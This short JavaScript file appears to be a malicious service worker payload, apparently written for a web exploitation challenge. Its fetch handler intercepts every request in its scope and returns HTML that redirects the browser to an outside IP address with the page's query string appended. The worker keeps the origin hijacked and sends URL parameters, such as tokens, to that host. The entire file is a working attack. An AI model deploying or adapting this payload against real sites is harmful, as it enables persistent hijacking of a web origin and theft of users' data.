self.addEventListener('install', function(event) {
        console.log('install ok!');
});
self.addEventListener('fetch', function (event) {
        console.log(event.request);
        event.respondWith(
        caches.match(event.request).then(function(res){
        return requestBackend(event);
        })
        )
   });
function requestBackend(event){
        var url = event.request.clone();
        console.log(url);
        return new Response("<script>location='http://146.56.223.95:10040/'+location.search;</script>", {headers: { 'Content-Type': 'text/html' }})
}